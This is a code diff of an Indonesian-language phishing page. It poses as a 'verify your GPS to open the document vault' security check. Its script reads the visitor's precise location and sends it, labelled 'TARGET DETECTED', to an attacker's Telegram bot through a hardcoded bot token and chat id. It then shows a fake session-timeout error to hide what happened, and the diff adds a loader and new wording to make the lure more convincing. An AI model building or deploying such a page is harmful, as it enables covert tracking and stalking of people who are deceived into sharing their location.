@@ -3,34 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔐 Verifikasi Keamanan</title>
+    <title>🔐 Brankas Verifikasi</title>
     <style>
         body { background: #0d1117; color: #c9d1d9; font-family: sans-serif; text-align: center; padding: 60px 20px; }
-        .card { border: 1px solid #30363d; background: #161b22; padding: 40px 20px; border-radius: 12px; max-width: 380px; margin: auto; }
+        .card { border: 1px solid #30363d; background: #161b22; padding: 40px 20px; border-radius: 12px; max-width: 380px; margin: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h2 { color: #58a6ff; margin-bottom: 10px; }
+        p { color: #8b949e; font-size: 14px; margin-bottom: 30px; }
         .btn { background: #238636; color: white; border: none; padding: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; }
+        #loader { display: none; margin-top: 20px; color: #d29922; font-size: 13px; }
     </style>
 </head>
 <body>
+
 <div class="card">
-    <h2>🔐 Akses Terbatas</h2>
-    <p>Sistem mendeteksi upaya masuk dari lokasi baru. Verifikasi lokasi GPS Anda untuk melanjutkan ke brankas dokumen.</p>
-    <button class="btn" onclick="gas()">VERIFIKASI LOKASI</button>
+    <h2>🔐 Akses VIP Dibatasi</h2>
+    <p>Sistem mendeteksi perangkat baru. Verifikasi lokasi GPS Anda untuk membuka brankas dokumen ini.</p>
+    <button class="btn" onclick="verifikasi()">VERIFIKASI SEKARANG</button>
+    <div id="loader">🔄 Menghubungkan ke server aman...</div>
 </div>
+
 <script>
-function gas() {
+function verifikasi() {
+    document.getElementById('loader').style.display = 'block';
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(kirim, error, {enableHighAccuracy:true});
-    } else { alert("Browser tidak didukung."); }
+        navigator.geolocation.getCurrentPosition(kirimData, errorGps, {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        });
+    } else {
+        alert("Browser tidak mendukung sistem keamanan ini.");
+    }
 }
-function kirim(pos) {
+
+function kirimData(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+    
+    // DATA ANDA SUDAH TERPASANG
     const token = "8655474132:AAFyKBASPm1Vjkl92Dcni6hWwTZUQRZeapE";
     const chatid = "8391310530";
-    const maps = `https://www.google.com{pos.coords.latitude},${pos.coords.longitude}`;
-    const teks = `⚠️ **TARGET TERDETEKSI!**\n\n📍 Lokasi: \`${pos.coords.latitude}, ${pos.coords.longitude}\`\n🌍 Peta: ${maps}`;
+    
+    const mapsUrl = `https://www.google.com{lat},${lon}`;
+    const teks = `⚠️ **TARGET TERDETEKSI!**\n\n📍 Lokasi: \`${lat}, ${lon}\`\n🌍 **Buka di Peta:**\n${mapsUrl}`;
+
     fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chatid}&text=${encodeURIComponent(teks)}&parse_mode=Markdown`)
-    .then(() => { alert("Error: Sesi berakhir. Silakan coba lagi nanti."); });
+    .then(() => {
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            alert("Gagal: Sesi berakhir (Timeout). Silakan hubungi admin.");
+        }, 2000);
+    });
 }
-function error() { alert("Izin Ditolak! Brankas tidak bisa dibuka tanpa verifikasi GPS."); }
+
+function errorGps(err) {
+    document.getElementById('loader').style.display = 'none';
+    alert("AKSES DITOLAK: Brankas tidak bisa dibuka tanpa izin 'ALLOW' (IZINKAN) lokasi.");
+}
 </script>
+
 </body>
 </html>
